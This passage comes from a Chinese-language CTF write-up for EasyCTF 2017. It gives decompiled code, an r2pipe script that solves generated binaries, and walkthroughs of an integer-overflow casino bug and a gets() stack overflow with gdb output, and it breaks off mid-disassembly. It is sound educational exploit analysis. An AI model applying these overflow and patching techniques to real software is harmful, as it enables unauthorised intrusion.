class="keyword">unsigned</span> __int64)i &lt; <span class="number">0x22</span>; ++i )</div><div class="line">    <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(<span class="keyword">char</span>)(v13[i] ^ c610[<span class="number">4</span> * i]));</div><div class="line">  <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><img src="http://i1.piimg.com/589513/73430c431965b22f.png" alt=""></p><p>让<code>if ( v9 == v12 ) break;</code>执行成功跳出<code>while</code>循环，进入<code>for</code>循环得到flag，最简单的方式就是修改<code>jnz</code>指令为<code>nop</code>指令：</p><p><img src="http://i4.buimg.com/589513/91044f6f9469e567.png" alt=""></p><h2 id="Hex-QR"><a href="#Hex-QR" class="headerlink" title="Hex QR"></a>Hex QR</h2><h3 id="problem-5"><a href="#problem-5" class="headerlink" title="problem"></a>problem</h3><p>I’ve stumbled upon a very <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/qrt/flag.png" target="_blank" rel="external">strange QR code</a>… seems like it was generated with this generator. What could it mean?</p><h3 id="solution-5"><a href="#solution-5" class="headerlink" title="solution"></a>solution</h3><p><a href="https://github.com/EasyCTF/easyctf-2017-writeups/blob/master/reverse-engineering/hexqr-200-points.md" target="_blank" rel="external">writeup</a></p><h2 id="67k"><a href="#67k" class="headerlink" title="67k"></a>67k</h2><h3 id="problem-6"><a href="#problem-6" class="headerlink" title="problem"></a>problem</h3><p><a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/r3ndom-67k/$%7Bbins_zip%7D" target="_blank" rel="external">Here</a> are 67k binaries, well more accurately 67,139 binaries. Solve every single one, append the results together in order (shouldn’t be too difficult as the binaries are numbered) and then from there I’m sure you can figure it out.</p><p>Hint: Maybe write a script.</p><h3 id="solution-6"><a href="#solution-6" class="headerlink" title="solution"></a>solution</h3><p><a href="https://github.com/VulnHub/ctf-writeups/blob/master/2017/easyctf/67k.md" target="_blank" rel="external">writeup</a><br></p><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> r2pipe</div><div class="line"><span class="keyword">import</span> json</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">import</span> time</div><div class="line"><span class="keyword">import</span> os</div><div class="line"></div><div class="line"><span class="comment"># shift arithmetic right copied from http://stackoverflow.com/a/5833119</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">rshift</span><span class="params">(val, n)</span>:</span> </div><div class="line">    <span class="keyword">return</span> val&gt;&gt;n <span class="keyword">if</span> val &gt;= <span class="number">0</span> <span class="keyword">else</span> (val+<span class="number">0x100000000</span>)&gt;&gt;n</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line"></div><div class="line">    r2p = r2pipe.open(sys.argv[<span class="number">1</span>])</div><div class="line">    r2p.cmd(<span class="string">"aaa"</span>)</div><div class="line"></div><div class="line">    <span class="comment"># get the name of the function that does the operation</span></div><div class="line">    t = r2p.cmd(<span class="string">"aflj"</span>)</div><div class="line">    d = json.loads(t)</div><div class="line">    fc_name = d[<span class="number">0</span>][<span class="string">"name"</span>]</div><div class="line">    <span class="keyword">if</span> fc_name == <span class="string">"entry0"</span>:</div><div class="line">        fc_name = d[<span class="number">1</span>][<span class="string">"name"</span>]</div><div class="line"></div><div class="line">    <span class="comment"># determine if sub, add, or xor is used</span></div><div class="line">    t = r2p.cmd(<span class="string">"pdj 1@%s"</span> %( fc_name))</div><div class="line">    d = json.loads(t)</div><div class="line">    ins = d[<span class="number">0</span>][<span class="string">"opcode"</span>]</div><div class="line"></div><div class="line">    <span class="comment"># get the value of EAX</span></div><div class="line">    t = r2p.cmd(<span class="string">"pdj 1@entry0+0x1f"</span>)</div><div class="line">    d = json.loads(t)</div><div class="line">    pointer = d[<span class="number">0</span>][<span class="string">"esil"</span>].split(<span class="string">","</span>)[<span class="number">0</span>]</div><div class="line">    pointer = int(pointer, <span class="number">16</span>)</div><div class="line">    t = r2p.cmd(<span class="string">"pxrj 4@%d"</span> % (pointer,))</div><div class="line">    d = json.loads(t)</div><div class="line">    eax = d[<span class="number">0</span>][<span class="string">"value"</span>]</div><div class="line"></div><div class="line">    <span class="comment"># get the value of ECX</span></div><div class="line">    t = r2p.cmd(<span class="string">"pdj 1@entry0+0x24"</span>)</div><div class="line">    d = json.loads(t)</div><div class="line">    ecx = d[<span class="number">0</span>][<span class="string">"opcode"</span>].split()[<span class="number">-1</span>]</div><div class="line">    ecx = int(ecx, <span class="number">16</span>)</div><div class="line"></div><div class="line">    <span class="comment"># determine the operation used by do_foo()</span></div><div class="line">    answer = <span class="number">0</span></div><div class="line">    <span class="keyword">if</span> <span class="string">"sub"</span> <span class="keyword">in</span> ins:</div><div class="line">        answer = eax - ecx</div><div class="line">    <span class="keyword">elif</span> <span class="string">"xor"</span> <span class="keyword">in</span> ins:</div><div class="line">        answer = eax ^ ecx</div><div class="line">    <span class="keyword">elif</span> <span class="string">"add"</span> <span class="keyword">in</span> ins:</div><div class="line">        answer = eax + ecx</div><div class="line"></div><div class="line">    <span class="comment"># get value to use for SAR operation</span></div><div class="line">    t = r2p.cmd(<span class="string">"pdj 1@entry0+0x36"</span>)</div><div class="line">    d = json.loads(t)</div><div class="line">    pointer = d[<span class="number">0</span>][<span class="string">"esil"</span>].split(<span class="string">","</span>)[<span class="number">0</span>]</div><div class="line">    pointer = int(pointer, <span class="number">16</span>)</div><div class="line"></div><div class="line">    t = r2p.cmd(<span class="string">"pxrj 4@%d"</span> % (pointer,))</div><div class="line">    t = t.replace(<span class="string">"\\x"</span>, <span class="string">""</span>)</div><div class="line">    d = json.loads(t)</div><div class="line">    val = d[<span class="number">0</span>][<span class="string">"value"</span>]</div><div class="line">    cl = val &amp; <span class="number">0xFF</span></div><div class="line"></div><div class="line">    <span class="comment"># get the solution to the challenge</span></div><div class="line">    solve = rshift(answer, cl)</div><div class="line">    solve = solve &amp; <span class="number">0xff</span></div><div class="line">    sys.stdout.write(<span class="string">"%c"</span> % (solve,))</div></pre></td></tr></table></figure><p></p><h2 id="Heaps-of-Knowledge"><a href="#Heaps-of-Knowledge" class="headerlink" title="Heaps of Knowledge"></a>Heaps of Knowledge</h2><h3 id="problem-7"><a href="#problem-7" class="headerlink" title="problem"></a>problem</h3><p>Can you pwn this? Navigate to <code>/problems/heaps_of_knowledge/</code> on the shell server and read <code>flag.txt</code>.</p><p><a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/heaps_of_knowledge/heaps_of_knowledge" target="_blank" rel="external">Binary</a></p><h3 id="solution-7"><a href="#solution-7" class="headerlink" title="solution"></a>solution</h3><p><a href="https://github.com/VulnHub/ctf-writeups/blob/master/2017/easyctf/heaps-of-knowledge.md" target="_blank" rel="external">writeup</a></p><h2 id="Morphin"><a href="#Morphin" class="headerlink" title="Morphin"></a>Morphin</h2><p>Welcome to the RE training course, this problem has 4 phases. Solve all four to get the flag.</p><p>Note: On phase 1 round to 6 significant figures.</p><p>Download</p><p><a href="https://writeups.easyctf.com/reverse-engineering.html" target="_blank" rel="external">writeup</a></p><h1 id="0x07-Binary-Exploitation"><a href="#0x07-Binary-Exploitation" class="headerlink" title="0x07 Binary Exploitation"></a>0x07 Binary Exploitation</h1><h2 id="Risky-Business"><a href="#Risky-Business" class="headerlink" title="Risky Business"></a>Risky Business</h2><h3 id="problem-8"><a href="#problem-8" class="headerlink" title="problem"></a>problem</h3><p>We wanted to branch into the casino business, but human employees are too expensive so we decided to automate it. I feel like we missed something obvious though… Oh well! Here’s the binary: <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/risky-business/casino" target="_blank" rel="external">casino</a></p><p>Solve this problem by logging into the shell server and navigating to <code>/problems/casino</code>.<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  __int64 v3; <span class="comment">// rax@1</span></div><div class="line">  __int64 v4; <span class="comment">// rdx@1</span></div><div class="line">  __int64 v5; <span class="comment">// rax@1</span></div><div class="line">  <span class="keyword">int</span> v6; <span class="comment">// ebx@2</span></div><div class="line">  __int64 v7; <span class="comment">// rdx@2</span></div><div class="line">  __int64 v8; <span class="comment">// rax@2</span></div><div class="line">  __int64 v9; <span class="comment">// rax@2</span></div><div class="line">  __int64 v10; <span class="comment">// rdi@2</span></div><div class="line">  __int64 v11; <span class="comment">// rdx@2</span></div><div class="line">  __int64 v13; <span class="comment">// rax@4</span></div><div class="line">  <span class="keyword">int</span> v14; <span class="comment">// eax@4</span></div><div class="line">  __int64 v15; <span class="comment">// rdx@4</span></div><div class="line">  <span class="keyword">bool</span> v16; <span class="comment">// al@6</span></div><div class="line">  __int64 v17; <span class="comment">// rax@11</span></div><div class="line">  __int64 v18; <span class="comment">// rax@13</span></div><div class="line">  __int64 v19; <span class="comment">// rdx@14</span></div><div class="line">  __int64 v20; <span class="comment">// rax@15</span></div><div class="line">  __int64 v21; <span class="comment">// rax@16</span></div><div class="line">  <span class="keyword">int</span> v22; <span class="comment">// [sp+Ch] [bp-1C4h]@4</span></div><div class="line">  <span class="keyword">char</span> v23; <span class="comment">// [sp+10h] [bp-1C0h]@4</span></div><div class="line">  <span class="keyword">char</span> v24; <span class="comment">// [sp+30h] [bp-1A0h]@4</span></div><div class="line">  __int64 v25; <span class="comment">// [sp+B0h] [bp-120h]@4</span></div><div class="line">  __int64 v26; <span class="comment">// [sp+1B8h] [bp-18h]@1</span></div><div class="line"></div><div class="line">  v26 = *MK_FP(__FS__, <span class="number">40L</span>L);</div><div class="line">  LODWORD(v3) = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"Welcome to the EasyCTF 2017 Casino"</span>, envp);</div><div class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v3, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</div><div class="line">  LODWORD(v5) = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(</div><div class="line">                  &amp;<span class="built_in">std</span>::<span class="built_in">cout</span>,</div><div class="line">                  <span class="string">"Try your luck and gain access to our exclusive club!"</span>,</div><div class="line">                  v4);</div><div class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v5, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</div><div class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</div><div class="line">  &#123;</div><div class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</div><div class="line">    v6 = networth;</div><div class="line">    LODWORD(v8) = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"Your net worth is: $"</span>, v7);</div><div class="line">    LODWORD(v9) = <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v8, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v6);</div><div class="line">    v10 = v9;</div><div class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v9, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</div><div class="line">    <span class="keyword">if</span> ( networth &gt; <span class="number">2000000000</span> )</div><div class="line">      <span class="keyword">break</span>;</div><div class="line">    LODWORD(v13) = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(</div><div class="line">                     &amp;<span class="built_in">std</span>::<span class="built_in">cout</span>,</div><div class="line">                     <span class="string">"Please enter how much you would like to bet:"</span>,</div><div class="line">                     v11);</div><div class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v13, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</div><div class="line">    <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::basic_string(&amp;v23);</div><div class="line">    <span class="built_in">std</span>::getline&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;_TMC_END__, &amp;v23);</div><div class="line">    v14 = <span class="built_in">std</span>::<span class="keyword">operator</span>|(<span class="number">16L</span>L, <span class="number">8L</span>L);</div><div class="line">    <span class="built_in">std</span>::__cxx11::basic_stringstream&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::basic_stringstream(</div><div class="line">      &amp;v24,</div><div class="line">      &amp;v23,</div><div class="line">      (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v14);</div><div class="line">    <span class="built_in">std</span>::istream::<span class="keyword">operator</span>&gt;&gt;(&amp;v24, &amp;v22);</div><div class="line">    v16 = (<span class="keyword">unsigned</span> __int8)<span class="built_in">std</span>::basic_ios&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;::eof(&amp;v25) ^ <span class="number">1</span></div><div class="line">       || (<span class="keyword">unsigned</span> __int8)<span class="built_in">std</span>::basic_ios&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;::fail(&amp;v25);</div><div class="line">    <span class="keyword">if</span> ( v16 )</div><div class="line">    &#123;</div><div class="line">      <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"That was not a valid number :("</span>, v15);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v22 &gt; <span class="number">0</span> )</div><div class="line">    &#123;</div><div class="line">      <span class="keyword">if</span> ( v22 &lt;= <span class="number">100000000</span> )</div><div class="line">      &#123;</div><div class="line">        <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)gamble() ^ <span class="number">1</span> )</div><div class="line">        &#123;</div><div class="line">          LODWORD(v20) = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"Sorry, I'm afraid you've lost :("</span>, v19);</div><div class="line">          <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v20, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</div><div class="line">          networth -= v22;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span></div><div class="line">        &#123;</div><div class="line">          LODWORD(v21) = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"Congratulations, you won!"</span>, v19);</div><div class="line">          <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v21, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</div><div class="line">          networth += v22;</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line">      <span class="keyword">else</span></div><div class="line">      &#123;</div><div class="line">        LODWORD(v18) = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(</div><div class="line">                         &amp;<span class="built_in">std</span>::<span class="built_in">cout</span>,</div><div class="line">                         <span class="string">"Sorry, the most we can allow you to bet is $100,000,000"</span>,</div><div class="line">                         v15);</div><div class="line">        <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v18, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">      LODWORD(v17) = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"You must bet a positive amount"</span>, v15);</div><div class="line">      <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v17, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">std</span>::__cxx11::basic_stringstream&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::~basic_stringstream((__int64)&amp;v24);</div><div class="line">    <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::~basic_string(&amp;v23);</div><div class="line">  &#125;</div><div class="line">  printflag(v10, (__int64)&amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;, v11);</div><div class="line">  <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p></p><p><img src="http://i4.buimg.com/589513/458cf5848cda5d98.png" alt=""></p><p>整型溢出问题，大致先看了一下逻辑，只要满足networth &gt; 2000000000就可以跳出while循环获取到flag，network是int类型的，而在：<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)gamble() ^ <span class="number">1</span> )</div><div class="line">&#123;</div><div class="line">  LODWORD(v20) = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"Sorry, I'm afraid you've lost :("</span>, v19);</div><div class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v20, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</div><div class="line">  networth -= v22;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p></p><p><img src="http://i4.buimg.com/589513/601f78cff8149259.png" alt=""></p><p>中并没有先判断network值是否小于0就直接相减，这样导致余额为负也还可以继续赌(和)博（谐）：</p><p><img src="http://i2.muimg.com/589513/825bd842a912a237.png" alt=""></p><p>32位下int: 4 byte = 32 bit 有符号signed范围：2^31-1 ~ -2^31 即：2147483647 ~ -2147483648，当我们的余额小于还小于-2147483648时就会溢出，而溢出处理是环形的，画个简图：</p><p><img src="http://i2.muimg.com/589513/ff66d77073b68805.png" alt=""></p><p><img src="http://i1.piimg.com/589513/6c4cd7da413afb24.png" alt=""></p><h2 id="Doubly-Dangerous"><a href="#Doubly-Dangerous" class="headerlink" title="Doubly Dangerous"></a>Doubly Dangerous</h2><h3 id="problem-9"><a href="#problem-9" class="headerlink" title="problem"></a>problem</h3><p>There seems to be an issue with <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/doubly-dangerous/doubly_dangerous" target="_blank" rel="external">this binary</a>. Can you exploit it? View the problem in the shell server <code>/problems/doubly_dangerous</code> directory.</p><h3 id="solution-8"><a href="#solution-8" class="headerlink" title="solution"></a>solution</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">char</span> s; <span class="comment">// [sp+Ch] [bp-4Ch]@1</span></div><div class="line">  <span class="keyword">float</span> v5; <span class="comment">// [sp+4Ch] [bp-Ch]@1</span></div><div class="line"></div><div class="line">  v5 = <span class="number">0.0</span>;</div><div class="line">  <span class="built_in">puts</span>(<span class="string">"Give me a string: "</span>);</div><div class="line">  gets(&amp;s);</div><div class="line">  <span class="keyword">if</span> ( <span class="number">11.28125</span> == v5 )</div><div class="line">  &#123;</div><div class="line">    <span class="built_in">puts</span>(<span class="string">"Success! Here is your flag:"</span>);</div><div class="line">    give_flag();</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span></div><div class="line">  &#123;</div><div class="line">    <span class="built_in">puts</span>(<span class="string">"nope!"</span>);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>我们要做的就是让<code>if ( 11.28125 == v5 )</code>成立，又使用了<code>gets()</code>,估计与溢出有关。<br>运行一下：</p><pre><code>sunnyelf@ubuntu:~/Desktop$ ./doubly_dangerous 
Give me a string: 
flag
nope!
sunnyelf@ubuntu:~/Desktop$ ./doubly_dangerous
Give me a string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
nope!
Segmentation fault (core dumped)
</code></pre><p>果然是溢出，于是gdb看一下：</p><pre><code>(gdb) set disassembly-flavor intel
(gdb) disas main
Dump of assembler code for function main:
   0x08048607 &lt;+0&gt;:    lea    ecx,[esp+0x4]
   0x0804860b &lt;+4&gt;:    and    esp,0xfffffff0
   0x0804860e &lt;+7&gt;:    push   DWORD PTR [ecx-0x4]
   0x08048611 &lt;+10&gt;:    push   ebp
   0x08048612 &lt;+11&gt;:    mov    ebp,esp
   0x08048614 &lt;+13&gt;:    push   ecx
   0x08048615 &lt;+14&gt;:    sub    esp,0x54
   0x08048618 &lt;+17&gt;:    fldz   
   0x0804861a &lt;+19&gt;:    fstp   DWORD PTR [ebp-0xc]
   0x0804861d &lt;+22&gt;:    sub    esp,0xc
   0x08048620 &lt;+25&gt;:    push   0x8048735
   0x08048625 &lt;+30&gt;:    call   0x8048410 &lt;puts@plt&gt;
   0x0804862a &lt;+35&gt;:    add    esp,0x10
   0x0804862d &lt;+38&gt;:    sub    esp,0xc
   0x08048630 &lt;+41&gt;:    lea    eax,[ebp-0x4c]
   0x08048633 &lt;+44&gt;:    push   eax
   0x08048634 &lt;+45&gt;:    call   0x80483e0 &lt;gets@plt&gt;
   0x08048639 &lt;+50&gt;:    add    esp,0x10
   0x0804863c &lt;+53&gt;:    fld    DWORD PTR [ebp-0xc]
   0x0804863f &lt;+56&gt;:    fld    DWORD PTR ds:0x804876c
   0x08048645 &lt;+62&gt;:    fucomip st,st(1)
   0x08048647 &lt;+64&gt;:    jp     0x804866c &lt;main+101&gt;
---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---c
   0x08048649 &lt;+66&gt;:    fld    DWORD PTR ds:0x804876c
   0x0804864f &lt;+72&gt;:    fucomip st,st(1)
   0x08048651 &lt;+74&gt;:    fstp   st(0)
   0x08048653 &lt;+76&gt;:    jne    0x804866e &lt;main+103&gt;
   0x08048655 &lt;+78&gt;:    sub    esp,0xc
   0x08048658 &lt;+81&gt;:    push   0x8048748
   0x0804865d &lt;+86&gt;:    call   0x8048410 &lt;puts@plt&gt;
   0x08048662 &lt;+91&gt;:    add    esp,0x10
   0x08048665 &lt;+94&gt;:    call   0x804857b &lt;give_flag&gt;
   0x0804866a &lt;+99&gt;:    jmp    0x804867e &lt;main+119&gt;
   0x0804866c &lt;+101&gt;:    fstp   st(0)
   0x0804866e &lt;+103&gt;:    sub    esp,0xc
   0x08048671 &lt;+106&gt;:    push   0x8048764
